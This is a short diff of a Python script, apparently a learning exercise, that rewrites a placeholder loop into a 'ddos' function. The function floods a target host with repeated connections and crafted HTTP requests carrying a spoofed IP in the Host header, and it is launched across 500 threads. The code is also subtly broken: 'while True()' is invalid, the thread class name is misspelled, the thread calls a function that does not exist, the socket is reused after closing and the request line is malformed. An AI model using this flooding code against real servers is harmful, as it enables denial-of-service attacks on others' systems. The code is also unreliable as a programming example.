@@ -13,13 +13,19 @@ spoofed_ip = <spoofed_ip>
 
 # Create socket object.
 
-s = socket.socket(family=AF_INET, type=SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 '''
-work through the while Loop, use documentation and previous examples.
+Define function for DDoS and establish while Loop to maintain connection.
 '''
 
-while True:
-  s.connect(target_port)
-  s.send(500)
-  s.close()
+def ddos():
+  while True():
+    s.connect((target_host, target_port))
+    s.sendto(('GET /' + target_host + ' HTTP 1.1/\r\n').encode('ascii'), (target_host, target_port))
+    s.sendto(('Host: ' + spoofed_ip + ' \n\r\n\r').encode('ascii'), (target_host, target_port))
+    s.close()
+    
+for i in range(500):
+  thread = threading.thread(target=attack)
+    
